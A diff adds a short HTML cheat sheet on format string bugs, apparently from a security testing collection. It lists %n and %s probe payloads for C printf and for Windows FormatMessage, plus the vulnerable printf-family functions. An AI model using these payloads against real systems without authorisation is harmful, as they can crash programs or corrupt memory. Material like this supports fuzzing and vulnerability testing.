@@ -1,0 +1,27 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Format string overflow</title>
+</head><body><b><span style="font-size: 12pt">Payloads</span></b><br/>
+<br/>
+<b>C printf()</b><br/>
+<br/>
+<tt>%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n<br/>
+</tt><tt>%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s</tt><br/>
+<br/>
+<b>Windows Format Message<br/>
+</b><br/>
+<tt>%1!n!%2!n!%3!n!%4!n!%5!n!%6!n!%7!n!%8!n!%9!n!%10!n!<br/>
+</tt><tt>%1!s!%2!s!%3!s!%4!s!%5!s!%6!s!%7!s!%8!s!%9!s!%10!s!</tt><br/>
+<br/>
+<b><span style="font-size: 12pt">Vulnerable functions</span></b><br/>
+<br/>
+<tt>printf<br/>
+fprintf<br/>
+sprintf<br/>
+snprintf<br/>
+vfprintf<br/>
+vprintf<br/>
+vsprintf<br/>
+</tt><tt>vsnprintf</tt><br/>
+</body></html>
